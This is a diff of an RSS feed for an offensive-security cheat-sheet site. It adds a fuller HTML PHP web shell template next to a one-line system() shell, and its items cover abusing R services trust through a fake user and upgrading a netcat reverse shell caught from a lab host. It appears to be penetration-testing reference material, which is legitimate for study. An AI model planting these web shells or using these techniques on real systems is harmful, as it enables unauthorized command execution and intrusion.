@@ -19,14 +19,14 @@
       <link>https://tldrbins.github.io/php_cmd_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
-      <description>PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
+      <description>Template #1 &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; Template #2 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Command Shell&amp;lt;/title&amp;gt; &amp;lt;style&amp;gt; body { font-family: monospace; margin: 20px; } pre { background: #f4f4f4; padding: 10px; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form method=&amp;#34;GET&amp;#34; action=&amp;#34;&amp;lt;?php echo htmlspecialchars(basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;])); ?&amp;gt;&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;cmd&amp;#34; autofocus&amp;gt; &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Run&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;pre&amp;gt; &amp;lt;?php if (isset($_GET[&amp;#39;cmd&amp;#39;])) { $cmd = trim($_GET[&amp;#39;cmd&amp;#39;]); if (!empty($cmd)) { echo htmlspecialchars(shell_exec($cmd . &amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;), ENT_QUOTES, &amp;#39;UTF-8&amp;#39;); } } ?&amp;gt; &amp;lt;/pre&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; </description>
     </item>
     <item>
       <title>R Services</title>
       <link>https://tldrbins.github.io/r_services/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/r_services/</guid>
-      <description>Abuse #1: Fake a User 1. Check cat /etc/hosts.equiv (remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted &amp;#34;trusted&amp;#34; r # command access to your system . - root - local + sadm 2. Create the Target User Locally # Create a Fake User sudo useradd &amp;lt;USER&amp;gt; # Set Password sudo passwd &amp;lt;USER&amp;gt; $ sudo useradd sadm $ sudo passwd sadm New password: Retype new password: passwd: password updated successfully $ cat /etc/passwd | grep sadm sadm:x:1001:1001::/home/sadm:/bin/sh # Switch User su &amp;lt;USER&amp;gt; 3.</description>
+      <description>Abuse #1: Fake a User 1. Check cat /etc/hosts.equiv (remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted &amp;#34;trusted&amp;#34; r # command access to your system . - root - local + sadm 2. Create the Target User Locally # Create a fake user sudo useradd &amp;lt;USER&amp;gt; # Set password sudo passwd &amp;lt;USER&amp;gt; $ sudo useradd sadm $ sudo passwd sadm New password: Retype new password: passwd: password updated successfully $ cat /etc/passwd | grep sadm sadm:x:1001:1001::/home/sadm:/bin/sh # Switch user su &amp;lt;USER&amp;gt; 3.</description>
     </item>
     <item>
       <title>rbash</title>
@@ -40,7 +40,7 @@
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
+      <description>Check Installed Binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 33490 id uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat) python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; tomcat@kotarak-dmz:/$ zsh: suspended rlwrap nc -lvnp 1337 # Ctrl-Z to send the process to background, then stty raw -echo; fg $ stty raw -echo; fg [1] + continued rlwrap nc -lvnp 1337 tomcat@kotarak-dmz:/$ # Start a local http server python3 -m http.</description>
     </item>
   </channel>
 </rss>
